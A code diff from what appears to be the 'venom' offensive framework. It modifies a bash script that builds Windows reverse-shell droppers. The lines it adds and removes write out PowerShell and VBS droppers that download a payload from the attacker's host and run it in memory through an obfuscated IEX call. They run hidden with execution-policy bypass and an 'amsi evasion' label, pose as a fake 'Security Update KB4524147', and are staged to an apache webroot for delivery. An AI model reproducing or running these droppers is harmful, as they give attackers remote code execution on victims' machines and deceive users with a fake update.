@@ -11949,7 +11949,6 @@ cat << !
     | DESCRIPTION        : Reverse TCP Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : WinHttpRequest (Fileless)
-    | SILENT EXECUTION   : $easter_egg
     | DROPPER EXTENSION  : PS1
     | AGENT EXTENSION    : PS1
     |_AGENT PERSISTENCE  : NOT AVAILABLE
@@ -11959,7 +11958,6 @@ cat << !
     | DESCRIPTION        : Reverse OpenSSL Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (DownloadFile)
-    | SILENT EXECUTION   : $easter_egg
     | DROPPER EXTENSION  : BAT
     | AGENT EXTENSION    : PS1
     |_AGENT PERSISTENCE  : AVAILABLE
@@ -11969,7 +11967,6 @@ cat << !
     | DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (DownloadFile)
-    | SILENT EXECUTION   : $easter_egg
     | DROPPER EXTENSION  : .{RANDOM}.BAT (MITRE T1036)
     | AGENT EXTENSION    : PS1
     |_AGENT PERSISTENCE  : AVAILABLE
@@ -12054,19 +12051,6 @@ echo "---"
 echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
 
 if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
-   echo "<#" > $IPATH/output/$Drop.ps1
-   echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
-   echo "#>" >> $IPATH/output/$Drop.ps1
-   echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
-   echo "write-Host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System ..\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
-   echo "  \$Kbid=Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
-   echo "  \$KBid;\$KBid | Out-File -Encoding utf8 -FilePath 'Recent_OS_Updates.txt' -Force;" >> $IPATH/output/$Drop.ps1
-   echo "     \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
-   echo "        \$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);" >> $IPATH/output/$Drop.ps1
-   echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
-   ## Obfuscated IEX (Invoke-Expression) API call (in PS console)
-   echo "& ('ie'+'x') \$proxy.responseText;" >> $IPATH/output/$Drop.ps1
-else
    ## Hidde powershell execution terminal windows
    # DESCRIPTION: dropper.ps1 will write in $env:tmp folder the REAL dropper (KB4524147_4nF7.ps1)
    # then execute it in a PS hidden console (to download/exec payload.ps1 in ram)..
@@ -12083,6 +12067,11 @@ else
    echo "echo \"        \`\$proxy.send();\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "Start-Sleep -Seconds 2;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1 
+else
+   ## Silent Execution -> OBFUSCATION=ON (none terminal popup)
+   echo "' Framework: venom v1.0.16 (amsi evasion)" > $IPATH/output/$Drop.vbs
+   echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
+   echo "objShell.Run \"cmd /c powershell \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\", 0, True" >> $IPATH/output/$Drop.vbs
 fi
 
 
@@ -12133,8 +12122,12 @@ cd $IPATH
 
 ## Copy files to apache2 webroot
 cd $IPATH/output
-zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
+if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
+   zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
+else
+   zip $Drop.zip $Drop.vbs > /dev/nul 2>&1
+fi
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
 cd $IPATH
